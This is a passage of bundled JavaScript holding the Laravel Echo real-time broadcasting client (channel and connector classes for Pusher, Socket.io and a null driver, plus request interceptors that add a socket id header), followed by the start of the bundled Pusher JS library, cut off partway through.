function _extends() {
  _extends = Object.assign || function(target) {
    for (var i2 = 1; i2 < arguments.length; i2++) {
      var source = arguments[i2];
      for (var key in source) {
        if (Object.prototype.hasOwnProperty.call(source, key)) {
          target[key] = source[key];
        }
      }
    }
    return target;
  };
  return _extends.apply(this, arguments);
}
function _inherits(subClass, superClass) {
  if (typeof superClass !== "function" && superClass !== null) {
    throw new TypeError("Super expression must either be null or a function");
  }
  subClass.prototype = Object.create(superClass && superClass.prototype, {
    constructor: {
      value: subClass,
      writable: true,
      configurable: true
    }
  });
  Object.defineProperty(subClass, "prototype", {
    writable: false
  });
  if (superClass) _setPrototypeOf(subClass, superClass);
}
function _getPrototypeOf(o) {
  _getPrototypeOf = Object.setPrototypeOf ? Object.getPrototypeOf : function _getPrototypeOf2(o2) {
    return o2.__proto__ || Object.getPrototypeOf(o2);
  };
  return _getPrototypeOf(o);
}
function _setPrototypeOf(o, p) {
  _setPrototypeOf = Object.setPrototypeOf || function _setPrototypeOf2(o2, p2) {
    o2.__proto__ = p2;
    return o2;
  };
  return _setPrototypeOf(o, p);
}
function _isNativeReflectConstruct() {
  if (typeof Reflect === "undefined" || !Reflect.construct) return false;
  if (Reflect.construct.sham) return false;
  if (typeof Proxy === "function") return true;
  try {
    Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], function() {
    }));
    return true;
  } catch (e2) {
    return false;
  }
}
function _assertThisInitialized(self) {
  if (self === void 0) {
    throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
  }
  return self;
}
function _possibleConstructorReturn(self, call) {
  if (call && (typeof call === "object" || typeof call === "function")) {
    return call;
  } else if (call !== void 0) {
    throw new TypeError("Derived constructors may only return object or undefined");
  }
  return _assertThisInitialized(self);
}
function _createSuper(Derived) {
  var hasNativeReflectConstruct = _isNativeReflectConstruct();
  return function _createSuperInternal() {
    var Super = _getPrototypeOf(Derived), result;
    if (hasNativeReflectConstruct) {
      var NewTarget = _getPrototypeOf(this).constructor;
      result = Reflect.construct(Super, arguments, NewTarget);
    } else {
      result = Super.apply(this, arguments);
    }
    return _possibleConstructorReturn(this, result);
  };
}
var Channel = /* @__PURE__ */ function() {
  function Channel2() {
    _classCallCheck(this, Channel2);
  }
  _createClass(Channel2, [{
    key: "listenForWhisper",
    value: (
      /**
       * Listen for a whisper event on the channel instance.
       */
      function listenForWhisper(event, callback) {
        return this.listen(".client-" + event, callback);
      }
    )
    /**
     * Listen for an event on the channel instance.
     */
  }, {
    key: "notification",
    value: function notification(callback) {
      return this.listen(".Illuminate\\Notifications\\Events\\BroadcastNotificationCreated", callback);
    }
    /**
     * Stop listening for a whisper event on the channel instance.
     */
  }, {
    key: "stopListeningForWhisper",
    value: function stopListeningForWhisper(event, callback) {
      return this.stopListening(".client-" + event, callback);
    }
  }]);
  return Channel2;
}();
var EventFormatter = /* @__PURE__ */ function() {
  function EventFormatter2(namespace) {
    _classCallCheck(this, EventFormatter2);
    this.namespace = namespace;
  }
  _createClass(EventFormatter2, [{
    key: "format",
    value: function format(event) {
      if ([".", "\\"].includes(event.charAt(0))) {
        return event.substring(1);
      } else if (this.namespace) {
        event = this.namespace + "." + event;
      }
      return event.replace(/\./g, "\\");
    }
    /**
     * Set the event namespace.
     */
  }, {
    key: "setNamespace",
    value: function setNamespace(value) {
      this.namespace = value;
    }
  }]);
  return EventFormatter2;
}();
var PusherChannel = /* @__PURE__ */ function(_Channel) {
  _inherits(PusherChannel2, _Channel);
  var _super = _createSuper(PusherChannel2);
  function PusherChannel2(pusher2, name, options) {
    var _this;
    _classCallCheck(this, PusherChannel2);
    _this = _super.call(this);
    _this.name = name;
    _this.pusher = pusher2;
    _this.options = options;
    _this.eventFormatter = new EventFormatter(_this.options.namespace);
    _this.subscribe();
    return _this;
  }
  _createClass(PusherChannel2, [{
    key: "subscribe",
    value: function subscribe() {
      this.subscription = this.pusher.subscribe(this.name);
    }
    /**
     * Unsubscribe from a Pusher channel.
     */
  }, {
    key: "unsubscribe",
    value: function unsubscribe() {
      this.pusher.unsubscribe(this.name);
    }
    /**
     * Listen for an event on the channel instance.
     */
  }, {
    key: "listen",
    value: function listen(event, callback) {
      this.on(this.eventFormatter.format(event), callback);
      return this;
    }
    /**
     * Listen for all events on the channel instance.
     */
  }, {
    key: "listenToAll",
    value: function listenToAll(callback) {
      var _this2 = this;
      this.subscription.bind_global(function(event, data) {
        if (event.startsWith("pusher:")) {
          return;
        }
        var namespace = _this2.options.namespace.replace(/\./g, "\\");
        var formattedEvent = event.startsWith(namespace) ? event.substring(namespace.length + 1) : "." + event;
        callback(formattedEvent, data);
      });
      return this;
    }
    /**
     * Stop listening for an event on the channel instance.
     */
  }, {
    key: "stopListening",
    value: function stopListening(event, callback) {
      if (callback) {
        this.subscription.unbind(this.eventFormatter.format(event), callback);
      } else {
        this.subscription.unbind(this.eventFormatter.format(event));
      }
      return this;
    }
    /**
     * Stop listening for all events on the channel instance.
     */
  }, {
    key: "stopListeningToAll",
    value: function stopListeningToAll(callback) {
      if (callback) {
        this.subscription.unbind_global(callback);
      } else {
        this.subscription.unbind_global();
      }
      return this;
    }
    /**
     * Register a callback to be called anytime a subscription succeeds.
     */
  }, {
    key: "subscribed",
    value: function subscribed(callback) {
      this.on("pusher:subscription_succeeded", function() {
        callback();
      });
      return this;
    }
    /**
     * Register a callback to be called anytime a subscription error occurs.
     */
  }, {
    key: "error",
    value: function error2(callback) {
      this.on("pusher:subscription_error", function(status) {
        callback(status);
      });
      return this;
    }
    /**
     * Bind a channel to an event.
     */
  }, {
    key: "on",
    value: function on2(event, callback) {
      this.subscription.bind(event, callback);
      return this;
    }
  }]);
  return PusherChannel2;
}(Channel);
var PusherPrivateChannel = /* @__PURE__ */ function(_PusherChannel) {
  _inherits(PusherPrivateChannel2, _PusherChannel);
  var _super = _createSuper(PusherPrivateChannel2);
  function PusherPrivateChannel2() {
    _classCallCheck(this, PusherPrivateChannel2);
    return _super.apply(this, arguments);
  }
  _createClass(PusherPrivateChannel2, [{
    key: "whisper",
    value: (
      /**
       * Send a whisper event to other clients in the channel.
       */
      function whisper(eventName, data) {
        this.pusher.channels.channels[this.name].trigger("client-".concat(eventName), data);
        return this;
      }
    )
  }]);
  return PusherPrivateChannel2;
}(PusherChannel);
var PusherEncryptedPrivateChannel = /* @__PURE__ */ function(_PusherChannel) {
  _inherits(PusherEncryptedPrivateChannel2, _PusherChannel);
  var _super = _createSuper(PusherEncryptedPrivateChannel2);
  function PusherEncryptedPrivateChannel2() {
    _classCallCheck(this, PusherEncryptedPrivateChannel2);
    return _super.apply(this, arguments);
  }
  _createClass(PusherEncryptedPrivateChannel2, [{
    key: "whisper",
    value: (
      /**
       * Send a whisper event to other clients in the channel.
       */
      function whisper(eventName, data) {
        this.pusher.channels.channels[this.name].trigger("client-".concat(eventName), data);
        return this;
      }
    )
  }]);
  return PusherEncryptedPrivateChannel2;
}(PusherChannel);
var PusherPresenceChannel = /* @__PURE__ */ function(_PusherChannel) {
  _inherits(PusherPresenceChannel2, _PusherChannel);
  var _super = _createSuper(PusherPresenceChannel2);
  function PusherPresenceChannel2() {
    _classCallCheck(this, PusherPresenceChannel2);
    return _super.apply(this, arguments);
  }
  _createClass(PusherPresenceChannel2, [{
    key: "here",
    value: (
      /**
       * Register a callback to be called anytime the member list changes.
       */
      function here(callback) {
        this.on("pusher:subscription_succeeded", function(data) {
          callback(Object.keys(data.members).map(function(k) {
            return data.members[k];
          }));
        });
        return this;
      }
    )
    /**
     * Listen for someone joining the channel.
     */
  }, {
    key: "joining",
    value: function joining(callback) {
      this.on("pusher:member_added", function(member) {
        callback(member.info);
      });
      return this;
    }
    /**
     * Send a whisper event to other clients in the channel.
     */
  }, {
    key: "whisper",
    value: function whisper(eventName, data) {
      this.pusher.channels.channels[this.name].trigger("client-".concat(eventName), data);
      return this;
    }
    /**
     * Listen for someone leaving the channel.
     */
  }, {
    key: "leaving",
    value: function leaving(callback) {
      this.on("pusher:member_removed", function(member) {
        callback(member.info);
      });
      return this;
    }
  }]);
  return PusherPresenceChannel2;
}(PusherChannel);
var SocketIoChannel = /* @__PURE__ */ function(_Channel) {
  _inherits(SocketIoChannel2, _Channel);
  var _super = _createSuper(SocketIoChannel2);
  function SocketIoChannel2(socket, name, options) {
    var _this;
    _classCallCheck(this, SocketIoChannel2);
    _this = _super.call(this);
    _this.events = {};
    _this.listeners = {};
    _this.name = name;
    _this.socket = socket;
    _this.options = options;
    _this.eventFormatter = new EventFormatter(_this.options.namespace);
    _this.subscribe();
    return _this;
  }
  _createClass(SocketIoChannel2, [{
    key: "subscribe",
    value: function subscribe() {
      this.socket.emit("subscribe", {
        channel: this.name,
        auth: this.options.auth || {}
      });
    }
    /**
     * Unsubscribe from channel and ubind event callbacks.
     */
  }, {
    key: "unsubscribe",
    value: function unsubscribe() {
      this.unbind();
      this.socket.emit("unsubscribe", {
        channel: this.name,
        auth: this.options.auth || {}
      });
    }
    /**
     * Listen for an event on the channel instance.
     */
  }, {
    key: "listen",
    value: function listen(event, callback) {
      this.on(this.eventFormatter.format(event), callback);
      return this;
    }
    /**
     * Stop listening for an event on the channel instance.
     */
  }, {
    key: "stopListening",
    value: function stopListening(event, callback) {
      this.unbindEvent(this.eventFormatter.format(event), callback);
      return this;
    }
    /**
     * Register a callback to be called anytime a subscription succeeds.
     */
  }, {
    key: "subscribed",
    value: function subscribed(callback) {
      this.on("connect", function(socket) {
        callback(socket);
      });
      return this;
    }
    /**
     * Register a callback to be called anytime an error occurs.
     */
  }, {
    key: "error",
    value: function error2(callback) {
      return this;
    }
    /**
     * Bind the channel's socket to an event and store the callback.
     */
  }, {
    key: "on",
    value: function on2(event, callback) {
      var _this2 = this;
      this.listeners[event] = this.listeners[event] || [];
      if (!this.events[event]) {
        this.events[event] = function(channel, data) {
          if (_this2.name === channel && _this2.listeners[event]) {
            _this2.listeners[event].forEach(function(cb) {
              return cb(data);
            });
          }
        };
        this.socket.on(event, this.events[event]);
      }
      this.listeners[event].push(callback);
      return this;
    }
    /**
     * Unbind the channel's socket from all stored event callbacks.
     */
  }, {
    key: "unbind",
    value: function unbind() {
      var _this3 = this;
      Object.keys(this.events).forEach(function(event) {
        _this3.unbindEvent(event);
      });
    }
    /**
     * Unbind the listeners for the given event.
     */
  }, {
    key: "unbindEvent",
    value: function unbindEvent(event, callback) {
      this.listeners[event] = this.listeners[event] || [];
      if (callback) {
        this.listeners[event] = this.listeners[event].filter(function(cb) {
          return cb !== callback;
        });
      }
      if (!callback || this.listeners[event].length === 0) {
        if (this.events[event]) {
          this.socket.removeListener(event, this.events[event]);
          delete this.events[event];
        }
        delete this.listeners[event];
      }
    }
  }]);
  return SocketIoChannel2;
}(Channel);
var SocketIoPrivateChannel = /* @__PURE__ */ function(_SocketIoChannel) {
  _inherits(SocketIoPrivateChannel2, _SocketIoChannel);
  var _super = _createSuper(SocketIoPrivateChannel2);
  function SocketIoPrivateChannel2() {
    _classCallCheck(this, SocketIoPrivateChannel2);
    return _super.apply(this, arguments);
  }
  _createClass(SocketIoPrivateChannel2, [{
    key: "whisper",
    value: (
      /**
       * Send a whisper event to other clients in the channel.
       */
      function whisper(eventName, data) {
        this.socket.emit("client event", {
          channel: this.name,
          event: "client-".concat(eventName),
          data
        });
        return this;
      }
    )
  }]);
  return SocketIoPrivateChannel2;
}(SocketIoChannel);
var SocketIoPresenceChannel = /* @__PURE__ */ function(_SocketIoPrivateChann) {
  _inherits(SocketIoPresenceChannel2, _SocketIoPrivateChann);
  var _super = _createSuper(SocketIoPresenceChannel2);
  function SocketIoPresenceChannel2() {
    _classCallCheck(this, SocketIoPresenceChannel2);
    return _super.apply(this, arguments);
  }
  _createClass(SocketIoPresenceChannel2, [{
    key: "here",
    value: (
      /**
       * Register a callback to be called anytime the member list changes.
       */
      function here(callback) {
        this.on("presence:subscribed", function(members) {
          callback(members.map(function(m3) {
            return m3.user_info;
          }));
        });
        return this;
      }
    )
    /**
     * Listen for someone joining the channel.
     */
  }, {
    key: "joining",
    value: function joining(callback) {
      this.on("presence:joining", function(member) {
        return callback(member.user_info);
      });
      return this;
    }
    /**
     * Send a whisper event to other clients in the channel.
     */
  }, {
    key: "whisper",
    value: function whisper(eventName, data) {
      this.socket.emit("client event", {
        channel: this.name,
        event: "client-".concat(eventName),
        data
      });
      return this;
    }
    /**
     * Listen for someone leaving the channel.
     */
  }, {
    key: "leaving",
    value: function leaving(callback) {
      this.on("presence:leaving", function(member) {
        return callback(member.user_info);
      });
      return this;
    }
  }]);
  return SocketIoPresenceChannel2;
}(SocketIoPrivateChannel);
var NullChannel = /* @__PURE__ */ function(_Channel) {
  _inherits(NullChannel2, _Channel);
  var _super = _createSuper(NullChannel2);
  function NullChannel2() {
    _classCallCheck(this, NullChannel2);
    return _super.apply(this, arguments);
  }
  _createClass(NullChannel2, [{
    key: "subscribe",
    value: (
      /**
       * Subscribe to a channel.
       */
      function subscribe() {
      }
    )
    /**
     * Unsubscribe from a channel.
     */
  }, {
    key: "unsubscribe",
    value: function unsubscribe() {
    }
    /**
     * Listen for an event on the channel instance.
     */
  }, {
    key: "listen",
    value: function listen(event, callback) {
      return this;
    }
    /**
     * Listen for all events on the channel instance.
     */
  }, {
    key: "listenToAll",
    value: function listenToAll(callback) {
      return this;
    }
    /**
     * Stop listening for an event on the channel instance.
     */
  }, {
    key: "stopListening",
    value: function stopListening(event, callback) {
      return this;
    }
    /**
     * Register a callback to be called anytime a subscription succeeds.
     */
  }, {
    key: "subscribed",
    value: function subscribed(callback) {
      return this;
    }
    /**
     * Register a callback to be called anytime an error occurs.
     */
  }, {
    key: "error",
    value: function error2(callback) {
      return this;
    }
    /**
     * Bind a channel to an event.
     */
  }, {
    key: "on",
    value: function on2(event, callback) {
      return this;
    }
  }]);
  return NullChannel2;
}(Channel);
var NullPrivateChannel = /* @__PURE__ */ function(_NullChannel) {
  _inherits(NullPrivateChannel2, _NullChannel);
  var _super = _createSuper(NullPrivateChannel2);
  function NullPrivateChannel2() {
    _classCallCheck(this, NullPrivateChannel2);
    return _super.apply(this, arguments);
  }
  _createClass(NullPrivateChannel2, [{
    key: "whisper",
    value: (
      /**
       * Send a whisper event to other clients in the channel.
       */
      function whisper(eventName, data) {
        return this;
      }
    )
  }]);
  return NullPrivateChannel2;
}(NullChannel);
var NullPresenceChannel = /* @__PURE__ */ function(_NullChannel) {
  _inherits(NullPresenceChannel2, _NullChannel);
  var _super = _createSuper(NullPresenceChannel2);
  function NullPresenceChannel2() {
    _classCallCheck(this, NullPresenceChannel2);
    return _super.apply(this, arguments);
  }
  _createClass(NullPresenceChannel2, [{
    key: "here",
    value: (
      /**
       * Register a callback to be called anytime the member list changes.
       */
      function here(callback) {
        return this;
      }
    )
    /**
     * Listen for someone joining the channel.
     */
  }, {
    key: "joining",
    value: function joining(callback) {
      return this;
    }
    /**
     * Send a whisper event to other clients in the channel.
     */
  }, {
    key: "whisper",
    value: function whisper(eventName, data) {
      return this;
    }
    /**
     * Listen for someone leaving the channel.
     */
  }, {
    key: "leaving",
    value: function leaving(callback) {
      return this;
    }
  }]);
  return NullPresenceChannel2;
}(NullChannel);
var Connector = /* @__PURE__ */ function() {
  function Connector2(options) {
    _classCallCheck(this, Connector2);
    this._defaultOptions = {
      auth: {
        headers: {}
      },
      authEndpoint: "/broadcasting/auth",
      userAuthentication: {
        endpoint: "/broadcasting/user-auth",
        headers: {}
      },
      broadcaster: "pusher",
      csrfToken: null,
      bearerToken: null,
      host: null,
      key: null,
      namespace: "App.Events"
    };
    this.setOptions(options);
    this.connect();
  }
  _createClass(Connector2, [{
    key: "setOptions",
    value: function setOptions(options) {
      this.options = _extends(this._defaultOptions, options);
      var token = this.csrfToken();
      if (token) {
        this.options.auth.headers["X-CSRF-TOKEN"] = token;
        this.options.userAuthentication.headers["X-CSRF-TOKEN"] = token;
      }
      token = this.options.bearerToken;
      if (token) {
        this.options.auth.headers["Authorization"] = "Bearer " + token;
        this.options.userAuthentication.headers["Authorization"] = "Bearer " + token;
      }
      return options;
    }
    /**
     * Extract the CSRF token from the page.
     */
  }, {
    key: "csrfToken",
    value: function csrfToken() {
      var selector;
      if (typeof window !== "undefined" && window["Laravel"] && window["Laravel"].csrfToken) {
        return window["Laravel"].csrfToken;
      } else if (this.options.csrfToken) {
        return this.options.csrfToken;
      } else if (typeof document !== "undefined" && typeof document.querySelector === "function" && (selector = document.querySelector('meta[name="csrf-token"]'))) {
        return selector.getAttribute("content");
      }
      return null;
    }
  }]);
  return Connector2;
}();
var PusherConnector = /* @__PURE__ */ function(_Connector) {
  _inherits(PusherConnector2, _Connector);
  var _super = _createSuper(PusherConnector2);
  function PusherConnector2() {
    var _this;
    _classCallCheck(this, PusherConnector2);
    _this = _super.apply(this, arguments);
    _this.channels = {};
    return _this;
  }
  _createClass(PusherConnector2, [{
    key: "connect",
    value: function connect() {
      if (typeof this.options.client !== "undefined") {
        this.pusher = this.options.client;
      } else if (this.options.Pusher) {
        this.pusher = new this.options.Pusher(this.options.key, this.options);
      } else {
        this.pusher = new Pusher(this.options.key, this.options);
      }
    }
    /**
     * Sign in the user via Pusher user authentication (https://pusher.com/docs/channels/using_channels/user-authentication/).
     */
  }, {
    key: "signin",
    value: function signin() {
      this.pusher.signin();
    }
    /**
     * Listen for an event on a channel instance.
     */
  }, {
    key: "listen",
    value: function listen(name, event, callback) {
      return this.channel(name).listen(event, callback);
    }
    /**
     * Get a channel instance by name.
     */
  }, {
    key: "channel",
    value: function channel(name) {
      if (!this.channels[name]) {
        this.channels[name] = new PusherChannel(this.pusher, name, this.options);
      }
      return this.channels[name];
    }
    /**
     * Get a private channel instance by name.
     */
  }, {
    key: "privateChannel",
    value: function privateChannel(name) {
      if (!this.channels["private-" + name]) {
        this.channels["private-" + name] = new PusherPrivateChannel(this.pusher, "private-" + name, this.options);
      }
      return this.channels["private-" + name];
    }
    /**
     * Get a private encrypted channel instance by name.
     */
  }, {
    key: "encryptedPrivateChannel",
    value: function encryptedPrivateChannel(name) {
      if (!this.channels["private-encrypted-" + name]) {
        this.channels["private-encrypted-" + name] = new PusherEncryptedPrivateChannel(this.pusher, "private-encrypted-" + name, this.options);
      }
      return this.channels["private-encrypted-" + name];
    }
    /**
     * Get a presence channel instance by name.
     */
  }, {
    key: "presenceChannel",
    value: function presenceChannel(name) {
      if (!this.channels["presence-" + name]) {
        this.channels["presence-" + name] = new PusherPresenceChannel(this.pusher, "presence-" + name, this.options);
      }
      return this.channels["presence-" + name];
    }
    /**
     * Leave the given channel, as well as its private and presence variants.
     */
  }, {
    key: "leave",
    value: function leave(name) {
      var _this2 = this;
      var channels = [name, "private-" + name, "private-encrypted-" + name, "presence-" + name];
      channels.forEach(function(name2, index) {
        _this2.leaveChannel(name2);
      });
    }
    /**
     * Leave the given channel.
     */
  }, {
    key: "leaveChannel",
    value: function leaveChannel(name) {
      if (this.channels[name]) {
        this.channels[name].unsubscribe();
        delete this.channels[name];
      }
    }
    /**
     * Get the socket ID for the connection.
     */
  }, {
    key: "socketId",
    value: function socketId() {
      return this.pusher.connection.socket_id;
    }
    /**
     * Disconnect Pusher connection.
     */
  }, {
    key: "disconnect",
    value: function disconnect() {
      this.pusher.disconnect();
    }
  }]);
  return PusherConnector2;
}(Connector);
var SocketIoConnector = /* @__PURE__ */ function(_Connector) {
  _inherits(SocketIoConnector2, _Connector);
  var _super = _createSuper(SocketIoConnector2);
  function SocketIoConnector2() {
    var _this;
    _classCallCheck(this, SocketIoConnector2);
    _this = _super.apply(this, arguments);
    _this.channels = {};
    return _this;
  }
  _createClass(SocketIoConnector2, [{
    key: "connect",
    value: function connect() {
      var _this2 = this;
      var io2 = this.getSocketIO();
      this.socket = io2(this.options.host, this.options);
      this.socket.on("reconnect", function() {
        Object.values(_this2.channels).forEach(function(channel) {
          channel.subscribe();
        });
      });
      return this.socket;
    }
    /**
     * Get socket.io module from global scope or options.
     */
  }, {
    key: "getSocketIO",
    value: function getSocketIO() {
      if (typeof this.options.client !== "undefined") {
        return this.options.client;
      }
      if (typeof io !== "undefined") {
        return io;
      }
      throw new Error("Socket.io client not found. Should be globally available or passed via options.client");
    }
    /**
     * Listen for an event on a channel instance.
     */
  }, {
    key: "listen",
    value: function listen(name, event, callback) {
      return this.channel(name).listen(event, callback);
    }
    /**
     * Get a channel instance by name.
     */
  }, {
    key: "channel",
    value: function channel(name) {
      if (!this.channels[name]) {
        this.channels[name] = new SocketIoChannel(this.socket, name, this.options);
      }
      return this.channels[name];
    }
    /**
     * Get a private channel instance by name.
     */
  }, {
    key: "privateChannel",
    value: function privateChannel(name) {
      if (!this.channels["private-" + name]) {
        this.channels["private-" + name] = new SocketIoPrivateChannel(this.socket, "private-" + name, this.options);
      }
      return this.channels["private-" + name];
    }
    /**
     * Get a presence channel instance by name.
     */
  }, {
    key: "presenceChannel",
    value: function presenceChannel(name) {
      if (!this.channels["presence-" + name]) {
        this.channels["presence-" + name] = new SocketIoPresenceChannel(this.socket, "presence-" + name, this.options);
      }
      return this.channels["presence-" + name];
    }
    /**
     * Leave the given channel, as well as its private and presence variants.
     */
  }, {
    key: "leave",
    value: function leave(name) {
      var _this3 = this;
      var channels = [name, "private-" + name, "presence-" + name];
      channels.forEach(function(name2) {
        _this3.leaveChannel(name2);
      });
    }
    /**
     * Leave the given channel.
     */
  }, {
    key: "leaveChannel",
    value: function leaveChannel(name) {
      if (this.channels[name]) {
        this.channels[name].unsubscribe();
        delete this.channels[name];
      }
    }
    /**
     * Get the socket ID for the connection.
     */
  }, {
    key: "socketId",
    value: function socketId() {
      return this.socket.id;
    }
    /**
     * Disconnect Socketio connection.
     */
  }, {
    key: "disconnect",
    value: function disconnect() {
      this.socket.disconnect();
    }
  }]);
  return SocketIoConnector2;
}(Connector);
var NullConnector = /* @__PURE__ */ function(_Connector) {
  _inherits(NullConnector2, _Connector);
  var _super = _createSuper(NullConnector2);
  function NullConnector2() {
    var _this;
    _classCallCheck(this, NullConnector2);
    _this = _super.apply(this, arguments);
    _this.channels = {};
    return _this;
  }
  _createClass(NullConnector2, [{
    key: "connect",
    value: function connect() {
    }
    /**
     * Listen for an event on a channel instance.
     */
  }, {
    key: "listen",
    value: function listen(name, event, callback) {
      return new NullChannel();
    }
    /**
     * Get a channel instance by name.
     */
  }, {
    key: "channel",
    value: function channel(name) {
      return new NullChannel();
    }
    /**
     * Get a private channel instance by name.
     */
  }, {
    key: "privateChannel",
    value: function privateChannel(name) {
      return new NullPrivateChannel();
    }
    /**
     * Get a private encrypted channel instance by name.
     */
  }, {
    key: "encryptedPrivateChannel",
    value: function encryptedPrivateChannel(name) {
      return new NullPrivateChannel();
    }
    /**
     * Get a presence channel instance by name.
     */
  }, {
    key: "presenceChannel",
    value: function presenceChannel(name) {
      return new NullPresenceChannel();
    }
    /**
     * Leave the given channel, as well as its private and presence variants.
     */
  }, {
    key: "leave",
    value: function leave(name) {
    }
    /**
     * Leave the given channel.
     */
  }, {
    key: "leaveChannel",
    value: function leaveChannel(name) {
    }
    /**
     * Get the socket ID for the connection.
     */
  }, {
    key: "socketId",
    value: function socketId() {
      return "fake-socket-id";
    }
    /**
     * Disconnect the connection.
     */
  }, {
    key: "disconnect",
    value: function disconnect() {
    }
  }]);
  return NullConnector2;
}(Connector);
var Echo = /* @__PURE__ */ function() {
  function Echo2(options) {
    _classCallCheck(this, Echo2);
    this.options = options;
    this.connect();
    if (!this.options.withoutInterceptors) {
      this.registerInterceptors();
    }
  }
  _createClass(Echo2, [{
    key: "channel",
    value: function channel(_channel) {
      return this.connector.channel(_channel);
    }
    /**
     * Create a new connection.
     */
  }, {
    key: "connect",
    value: function connect() {
      if (this.options.broadcaster == "reverb") {
        this.connector = new PusherConnector(_extends(_extends({}, this.options), {
          cluster: ""
        }));
      } else if (this.options.broadcaster == "pusher") {
        this.connector = new PusherConnector(this.options);
      } else if (this.options.broadcaster == "socket.io") {
        this.connector = new SocketIoConnector(this.options);
      } else if (this.options.broadcaster == "null") {
        this.connector = new NullConnector(this.options);
      } else if (typeof this.options.broadcaster == "function") {
        this.connector = new this.options.broadcaster(this.options);
      } else {
        throw new Error("Broadcaster ".concat(_typeof(this.options.broadcaster), " ").concat(this.options.broadcaster, " is not supported."));
      }
    }
    /**
     * Disconnect from the Echo server.
     */
  }, {
    key: "disconnect",
    value: function disconnect() {
      this.connector.disconnect();
    }
    /**
     * Get a presence channel instance by name.
     */
  }, {
    key: "join",
    value: function join(channel) {
      return this.connector.presenceChannel(channel);
    }
    /**
     * Leave the given channel, as well as its private and presence variants.
     */
  }, {
    key: "leave",
    value: function leave(channel) {
      this.connector.leave(channel);
    }
    /**
     * Leave the given channel.
     */
  }, {
    key: "leaveChannel",
    value: function leaveChannel(channel) {
      this.connector.leaveChannel(channel);
    }
    /**
     * Leave all channels.
     */
  }, {
    key: "leaveAllChannels",
    value: function leaveAllChannels() {
      for (var channel in this.connector.channels) {
        this.leaveChannel(channel);
      }
    }
    /**
     * Listen for an event on a channel instance.
     */
  }, {
    key: "listen",
    value: function listen(channel, event, callback) {
      return this.connector.listen(channel, event, callback);
    }
    /**
     * Get a private channel instance by name.
     */
  }, {
    key: "private",
    value: function _private(channel) {
      return this.connector.privateChannel(channel);
    }
    /**
     * Get a private encrypted channel instance by name.
     */
  }, {
    key: "encryptedPrivate",
    value: function encryptedPrivate(channel) {
      return this.connector.encryptedPrivateChannel(channel);
    }
    /**
     * Get the Socket ID for the connection.
     */
  }, {
    key: "socketId",
    value: function socketId() {
      return this.connector.socketId();
    }
    /**
     * Register 3rd party request interceptiors. These are used to automatically
     * send a connections socket id to a Laravel app with a X-Socket-Id header.
     */
  }, {
    key: "registerInterceptors",
    value: function registerInterceptors() {
      if (typeof Vue === "function" && Vue.http) {
        this.registerVueRequestInterceptor();
      }
      if (typeof axios === "function") {
        this.registerAxiosRequestInterceptor();
      }
      if (typeof jQuery === "function") {
        this.registerjQueryAjaxSetup();
      }
      if ((typeof Turbo === "undefined" ? "undefined" : _typeof(Turbo)) === "object") {
        this.registerTurboRequestInterceptor();
      }
    }
    /**
     * Register a Vue HTTP interceptor to add the X-Socket-ID header.
     */
  }, {
    key: "registerVueRequestInterceptor",
    value: function registerVueRequestInterceptor() {
      var _this = this;
      Vue.http.interceptors.push(function(request, next) {
        if (_this.socketId()) {
          request.headers.set("X-Socket-ID", _this.socketId());
        }
        next();
      });
    }
    /**
     * Register an Axios HTTP interceptor to add the X-Socket-ID header.
     */
  }, {
    key: "registerAxiosRequestInterceptor",
    value: function registerAxiosRequestInterceptor() {
      var _this2 = this;
      axios.interceptors.request.use(function(config) {
        if (_this2.socketId()) {
          config.headers["X-Socket-Id"] = _this2.socketId();
        }
        return config;
      });
    }
    /**
     * Register jQuery AjaxPrefilter to add the X-Socket-ID header.
     */
  }, {
    key: "registerjQueryAjaxSetup",
    value: function registerjQueryAjaxSetup() {
      var _this3 = this;
      if (typeof jQuery.ajax != "undefined") {
        jQuery.ajaxPrefilter(function(options, originalOptions, xhr) {
          if (_this3.socketId()) {
            xhr.setRequestHeader("X-Socket-Id", _this3.socketId());
          }
        });
      }
    }
    /**
     * Register the Turbo Request interceptor to add the X-Socket-ID header.
     */
  }, {
    key: "registerTurboRequestInterceptor",
    value: function registerTurboRequestInterceptor() {
      var _this4 = this;
      document.addEventListener("turbo:before-fetch-request", function(event) {
        event.detail.fetchOptions.headers["X-Socket-Id"] = _this4.socketId();
      });
    }
  }]);
  return Echo2;
}();
var pusher = { exports: {} };
/*!
 * Pusher JavaScript Library v8.4.0-rc2
 * https://pusher.com/
 *
 * Copyright 2020, Pusher
 * Released under the MIT licence.
 */
(function(module, exports) {
  (function webpackUniversalModuleDefinition(root, factory) {
    module.exports = factory();
  })(window, function() {
    return (
      /******/
      function(modules) {
        var installedModules = {};
        function __webpack_require__(moduleId) {
          if (installedModules[moduleId]) {
            return installedModules[moduleId].exports;
          }
          var module2 = installedModules[moduleId] = {
            /******/
            i: moduleId,
            /******/
            l: false,
            /******/
            exports: {}
            /******/
          };
          modules[moduleId].call(module2.exports, module2, module2.exports, __webpack_require__);
          module2.l = true;
          return module2.exports;
        }
        __webpack_require__.m = modules;
        __webpack_require__.c = installedModules;
        __webpack_require__.d = function(exports2, name, getter) {
          if (!__webpack_require__.o(exports2, name)) {
            Object.defineProperty(exports2, name, { enumerable: true, get: getter });
          }
        };
        __webpack_require__.r = function(exports2) {
          if (typeof Symbol !== "undefined" && Symbol.toStringTag) {
            Object.defineProperty(exports2, Symbol.toStringTag, { value: "Module" });
          }
          Object.defineProperty(exports2, "__esModule", { value: true });
        };
        __webpack_require__.t = function(value, mode) {
          if (mode & 1) value = __webpack_require__(value);
          if (mode & 8) return value;
          if (mode & 4 && typeof value === "object" && value && value.__esModule) return value;
          var ns = /* @__PURE__ */ Object.create(null);
          __webpack_require__.r(ns);
          Object.defineProperty(ns, "default", { enumerable: true, value });
          if (mode & 2 && typeof value != "string") for (var key in value) __webpack_require__.d(ns, key, function(key2) {
            return value[key2];
          }.bind(null, key));
          return ns;
        };
        __webpack_require__.n = function(module2) {
          var getter = module2 && module2.__esModule ? (
            /******/
            function getDefault() {
              return module2["default"];
            }
          ) : (
            /******/
            function getModuleExports() {
              return module2;
            }
          );
          __webpack_require__.d(getter, "a", getter);
          return getter;
        };
        __webpack_require__.o = function(object, property) {
          return Object.prototype.hasOwnProperty.call(object, property);
        };
        __webpack_require__.p = "";
        return __webpack_require__(__webpack_require__.s = 2);
      }([
        /* 0 */
        /***/
        function(module2, exports2, __webpack_require__) {
          var __extends = this && this.__extends || /* @__PURE__ */ function() {
            var extendStatics = function(d3, b) {
              extendStatics = Object.setPrototypeOf || { __proto__: [] } instanceof Array && function(d4, b2) {
